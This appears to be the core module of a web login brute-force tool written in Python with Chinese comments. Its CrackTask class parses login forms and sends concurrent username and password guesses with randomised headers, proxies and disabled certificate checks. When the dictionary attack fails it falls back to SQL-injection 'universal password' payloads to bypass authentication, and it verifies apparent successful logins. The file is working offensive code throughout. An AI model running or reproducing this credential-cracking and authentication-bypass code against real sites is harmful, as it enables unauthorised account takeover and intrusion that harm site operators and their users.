import requests
import threading
from copy import copy, deepcopy
from contextlib import contextmanager
from concurrent.futures import FIRST_COMPLETED, ThreadPoolExecutor, wait
from enum import Enum
from parse.recognizers import json_path


class LoginState(Enum):
    SUCCESS = "success"
    FAILURE = "failure"
    UNKNOWN = "unknown"
    STOPPED = "stopped"
    ERROR = "error"


from generator.dict import *
from generator.header import get_random_headers
from conf.config import *
import logs.log as Log
from parse.parser import Parser, Parser as _ParserType
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import time


def get_res_length(res):
    # return len(res.text + str(res.headers))
    return len(res.text)


class CrackTask:
    id = 0
    url = ''
    parser = {}
    error_length = 0
    requests_proxies = {}
    timeout = 0
    fail_words = []
    test_username = ''
    test_password = ''
    conn = {}

    def __init__(self):
        # 加载配置文件
        self.requests_proxies = crackConfig["requests_proxies"]
        self.timeout = crackConfig["timeout"]
        self.fail_words = crackConfig["fail_words"]
        self.test_username = crackConfig["test_username"]
        self.test_password = crackConfig["test_password"]
        self.baseline_responses = []
        self.stopped = False
        self.conn = None
        self._json_sessions = None
        self._json_sessions_lock = threading.Lock()
        self.concurrency = crackConfig.get("concurrency", 5)
        if isinstance(self.concurrency, bool) or not isinstance(self.concurrency, int) or self.concurrency <= 0:
            raise ValueError("concurrency 必须是正整数")

    def run(self, id, url):
        self.id = id
        self.url = url
        print("")
        Log.init_log_id(id)
        Log.Info(f"[*] Start: {url}")
        try:
            self.conn = requests.session()
            self.parser = Parser(self.url, session=self.conn)
            if not self.parser.run():
                return
            self.error_length = self.get_error_length()
            username_dict, password_dict = gen_dict(url)
            username, password = self.crack_task(username_dict, password_dict)
            # 万能密码爆破
            if not username and not password and not self.stopped:
                if self.parser.cms:
                    sqlin_dict_enable = self.parser.cms["sqlin_able"]
                else:
                    sqlin_dict_enable = generatorConfig["dict_config"]["sqlin_dict"]["enable"]
                if sqlin_dict_enable:
                    Log.Info(f"[*] {url} 启动万能密码爆破模块")
                    sqlin_user_dict, sqlin_pass_dict = gen_sqlin_dict()
                    username, password = self.crack_task(sqlin_user_dict, sqlin_pass_dict)

            if username and password:
                Log.Success(f"[+] Success: {url}  {username}/{password}")
                return {"url": url, "username": username, "password": password}
            Log.Error("[-] Failed: " + url)
        except Exception as e:
            Log.Error(f"{str(e)}")
        finally:
            if self.conn is not None:
                self.conn.close()

    def crack_request(self, conn, username, password):
        data = self.parser.data.copy()
        path = self.parser.post_path
        data[self.parser.username_keyword] = username
        data[self.parser.password_keyword] = password
        headers = get_random_headers()
        headers.update(getattr(self.parser,"request_headers",{}))
        payload = {"data": data}
        if getattr(self.parser, "request_format", "form") == "json":
            headers["Content-Type"] = "application/json"
            payload = {"json": data}
        res = conn.post(url=path, **payload, headers=headers, timeout=self.timeout, verify=False,
                        allow_redirects=True, proxies=self.requests_proxies)
        time.sleep(crackConfig["delay"])
        res.encoding = res.apparent_encoding
        return res

    def _success_evidence(self, res):
        evidence = set()
        using_profile = getattr(self.parser,"profile_success_fields",None) is not None
        words = [] if using_profile else list(crackConfig.get("success_words", []))
        if self.parser.cms and self.parser.cms.get("success_flag"):
            words.append(self.parser.cms["success_flag"])
        for word in words:
            if word and word in res.text:
                evidence.add(("body", word))
        profile_rules = getattr(self.parser,"profile_success_fields",None)
        rules = crackConfig.get("json_success_fields", {}) if profile_rules is None else profile_rules
        if "json" in res.headers.get("Content-Type", "").lower():
            try:
                body = res.json()
                if isinstance(body, dict) and rules and all(
                    type(json_path(body,key)) is type(value) and json_path(body,key) == value
                    for key, value in rules.items()
                ):
                    required = getattr(self.parser,"json_required_nonempty_fields",[])
                    if all(isinstance(json_path(body,key),str) and json_path(body,key).strip() for key in required):
                        evidence.add(("json", "configured_fields"))
                inferred = getattr(self.parser, "json_response_success", {})
                required = getattr(self.parser, "json_required_nonempty_fields", [])
                if isinstance(body, dict) and inferred and all(
                    isinstance(json_path(body,key), str) and bool(json_path(body,key).strip()) for key in required
                ) and all(
                    any(type(json_path(body,key)) is type(value) and json_path(body,key) == value for value in values)
                    for key, values in inferred.items()
                ):
                    evidence.add(("json", "script_success_rule"))
                if isinstance(body, dict) and (getattr(self.parser, "request_format", "form") == "json"
                                              or getattr(self.parser,"json_token_fields",None) is not None):
                    profile_tokens = getattr(self.parser,"json_token_fields",None)
                    tokens = crackConfig.get("json_token_fields", []) if profile_tokens is None else profile_tokens
                    for field in tokens:
                        token = json_path(body,field)
                        required = getattr(self.parser,"json_required_nonempty_fields",[])
                        if (isinstance(token, str) and token.strip() and ((profile_rules is None and not inferred) or (profile_rules is not None and not profile_rules))
                                and all(isinstance(json_path(body,key),str) and json_path(body,key).strip() for key in required)):
                            evidence.add(("token", field))
            except (ValueError, TypeError):
                pass
        return evidence

    def classify_response(self, res, baselines=None):
        """初判与复核共用；长度、重定向和 Cookie 变化不单独证明成功。"""
        text = res.text.casefold()
        stop_words = list(crackConfig.get("stop_words", []))
        if self.parser.cms and self.parser.cms.get("die_flag"):
            stop_words.append(self.parser.cms["die_flag"])
        if res.status_code == 429 or any(word and word.casefold() in text for word in stop_words):
            return LoginState.STOPPED
        if res.status_code == 401:
            return LoginState.FAILURE
        if not 200 <= res.status_code < 300:
            return LoginState.ERROR
        if any(word and word.casefold() in text for word in self.fail_words):
            return LoginState.FAILURE
        # 正文中的真实登录表单仍存在时，不因长度或成功字样而报成功。
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(res.text, "lxml")
        for form in soup.find_all("form"):
            fields = form.find_all("input")
            names = {field.get("name", "") for field in fields}
            if any(field.get("type", "").lower() == "password" for field in fields) or (
                    self.parser.username_keyword in names and self.parser.password_keyword in names):
                return LoginState.FAILURE
        evidence = self._success_evidence(res)
        reference = self.baseline_responses if baselines is None else baselines
        for baseline in reference:
            evidence.difference_update(self._success_evidence(baseline))
        return LoginState.SUCCESS if evidence else LoginState.UNKNOWN

    def get_error_length(self):
        # 保留方法名供调用方兼容；长度仅作诊断，不参与成功判定。
        if self.conn is None:
            self.conn = requests.session()
        self.baseline_responses = [
            self.crack_request(self.conn, self.test_username, self.test_password)
            for _ in range(2)
        ]
        for res in self.baseline_responses:
            state = self.classify_response(res, baselines=[])
            if state in (LoginState.STOPPED, LoginState.ERROR, LoginState.SUCCESS):
                self.stopped = True
                raise ValueError("失败基线异常或包含成功证据，停止当前任务")
        return get_res_length(self.baseline_responses[0])

    def _fresh_response(self, username, password):
        # 每次复核使用独立会话，并重新获取页面 Cookie 和隐藏字段。
        previous = self.parser
        try:
            with requests.session() as conn:
                parser = Parser(self.url, session=conn)
                refreshed = parser.refresh_from(previous) if isinstance(previous, _ParserType) else parser.run()
                if not refreshed:
                    return None
                self.parser = parser
                return self.crack_request(conn, username, password)
        finally:
            self.parser = previous

    def recheck(self, username, password):
        password = password.replace('{user}', username)
        baseline = self._fresh_response(self.test_username, self.test_password)
        if baseline is None:
            return False
        baseline_state = self.classify_response(baseline, baselines=[])
        if baseline_state in (LoginState.ERROR, LoginState.STOPPED, LoginState.SUCCESS):
            self.stopped = True
            return False
        candidate = self._fresh_response(username, password)
        if candidate is None:
            return False
        state = self.classify_response(candidate, baselines=[baseline])
        if state in (LoginState.STOPPED, LoginState.ERROR):
            self.stopped = True
        return state == LoginState.SUCCESS

    def crack_task(self, username_dict, password_dict):
        if self.stopped:
            return False, False
        if self.concurrency == 1:
            return self._serial_crack_task(username_dict, password_dict)
        return self._concurrent_crack_task(username_dict, password_dict)

    def _copy_request_plan(self, conn):
        # 复用只读识别结果，独立复制请求数据和成功规则，避免复核/填参串线。
        parser = copy(self.parser)
        parser.session = conn
        for field in ("data", "request_headers", "cms", "json_token_fields",
                      "profile_success_fields", "json_response_success",
                      "json_required_nonempty_fields"):
            if hasattr(parser, field):
                setattr(parser, field, deepcopy(getattr(parser, field)))
        return parser

    @contextmanager
    def _request_context(self):
        if getattr(self.parser, "request_format", "form") != "json":
            # 表单可能包含一次性 CSRF 字段，仍逐次刷新；静态脚本使用任务缓存。
            with requests.session() as conn:
                parser = Parser(self.url, session=conn)
                refreshed = parser.refresh_from(self.parser) if isinstance(self.parser, _ParserType) else parser.run()
                if not refreshed:
                    raise ValueError("登录表单刷新失败")
                yield conn, parser
            return

        # JSON 接口映射是已识别的静态结构，不逐候选下载/识别 JS。
        thread_id = threading.get_ident()
        owned = self._json_sessions is None
        conn = None
        cached = None
        if not owned:
            with self._json_sessions_lock:
                cached = self._json_sessions.get(thread_id)
                if cached is not None:
                    conn, bootstrap = cached
        if conn is None:
            conn = requests.session()
            try:
                bootstrap = self._copy_request_plan(conn)
                if getattr(bootstrap, "diagnostic_code", "") != "PROFILE_APPLIED":
                    # 每个工作线程只初始化一次页面 Cookie，不再解析页面/脚本。
                    if not bootstrap.refresh_from(self.parser):
                        raise ValueError("登录页面状态刷新失败")
            except BaseException:
                conn.close()
                raise
            if not owned:
                with self._json_sessions_lock:
                    self._json_sessions[thread_id] = (conn, bootstrap)
        if cached is not None and bootstrap.request_format != "json":
            refreshed = Parser(self.url, session=conn)
            if not refreshed.refresh_from(bootstrap):
                raise ValueError("已变化的登录表单刷新失败")
            bootstrap = refreshed
            with self._json_sessions_lock:
                self._json_sessions[thread_id] = (conn, bootstrap)
        try:
            # 不修改协调线程的 parser；每次独立复制线程内已刷新的规则。
            parser = copy(bootstrap)
            for field in ("data", "request_headers", "cms", "json_token_fields",
                          "profile_success_fields", "json_response_success", "json_required_nonempty_fields"):
                setattr(parser, field, deepcopy(getattr(bootstrap, field)))
            yield conn, parser
        finally:
            if owned:
                conn.close()

    def _attempt(self, username, password, stop):
        """JSON 复用线程内连接与静态请求计划；动态表单逐次刷新。"""
        Log.init_log_id(self.id)
        worker = CrackTask()
        worker.id, worker.url = self.id, self.url
        worker.baseline_responses = list(self.baseline_responses)
        try:
            if stop.is_set():
                return None
            with self._request_context() as (conn, parser):
                worker.conn = conn
                worker.parser = parser
                if stop.is_set():
                    return None
                res = worker.crack_request(conn, username, password)
                state = worker.classify_response(res)
                if state in (LoginState.STOPPED, LoginState.ERROR):
                    stop.set()
                    Log.Info(f"[*] 停止当前任务: {state.value} HTTP {res.status_code}")
                return state, username, password, worker
        except Exception as exc:
            stop.set()
            Log.Error(f"[-] 登录请求异常: {self.url}: {exc}")
            return LoginState.ERROR, username, password, worker
        finally:
            worker.conn = None
            Log.init_log_id(None)

    def _concurrent_crack_task(self, username_dict, password_dict):
        total = len(username_dict) * len(password_dict)
        if not total:
            return False, False
        candidates = iter((username, password.replace('{user}', username))
                          for username in username_dict for password in password_dict)
        stop = threading.Event()
        pending = set()
        submitted = 0
        self._json_sessions = {}
        executor = ThreadPoolExecutor(max_workers=min(self.concurrency, total),
                                      thread_name_prefix="login-request")

        def submit_next():
            nonlocal submitted
            if stop.is_set():
                return
            candidate = next(candidates, None)
            if candidate is not None:
                username, password = candidate
                submitted += 1
                Log.Info(f"[*] {self.url} 进度: ({submitted}/{total}) checking: {username} {password}")
                pending.add(executor.submit(self._attempt, username, password, stop))

        try:
            for _ in range(min(self.concurrency, total)):
                submit_next()
            while pending:
                done, _ = wait(pending, return_when=FIRST_COMPLETED)
                pending.difference_update(done)
                outcomes = [future.result() for future in done]
                # 同一完成批次中限流/异常优先，避免忽略已观测的停止响应。
                if any(outcome and outcome[0] in (LoginState.STOPPED, LoginState.ERROR)
                       for outcome in outcomes):
                    self.stopped = True
                    return False, False
                for outcome in outcomes:
                    if outcome is None:
                        continue
                    state, username, password, worker = outcome
                    if state == LoginState.SUCCESS:
                        if stop.is_set():
                            self.stopped = True
                            return False, False
                        # 复核只在协调线程执行；worker 的 parser 与其他尝试隔离。
                        verified = worker.recheck(username, password)
                        if worker.stopped or stop.is_set():
                            self.stopped = True
                            return False, False
                        if verified:
                            return username, password
                    elif state == LoginState.UNKNOWN:
                        Log.Info("[*] 登录状态不确定：缺少明确成功证据")
                for _ in done:
                    submit_next()
            return False, False
        finally:
            stop.set()
            for future in pending:
                future.cancel()
            # 已发送请求仍需收尾；等待其关闭会话，停止提交新请求。
            executor.shutdown(wait=True, cancel_futures=True)
            for conn, parser in self._json_sessions.values():
                conn.close()
            self._json_sessions = None

    def _serial_crack_task(self, username_dict, password_dict):
        num = 0
        dic_all = len(username_dict) * len(password_dict)
        for username in username_dict:
            for password in password_dict:
                password = password.replace('{user}', username)
                num += 1
                Log.Info(f"[*] {self.url} 进度: ({num}/{dic_all}) checking: {username} {password}")
                res = self.crack_request(self.conn, username, password)
                state = self.classify_response(res)
                if state in (LoginState.STOPPED, LoginState.ERROR):
                    self.stopped = True
                    Log.Info(f"[*] 停止当前任务: {state.value} HTTP {res.status_code}")
                    return False, False
                if state == LoginState.SUCCESS:
                    # 复核失败后继续处理，而不是丢弃尚未检查的条目。
                    if self.recheck(username, password):
                        return username, password
                    if self.stopped:
                        return False, False
                elif state == LoginState.UNKNOWN:
                    Log.Info("[*] 登录状态不确定：缺少明确成功证据")
        return False, False
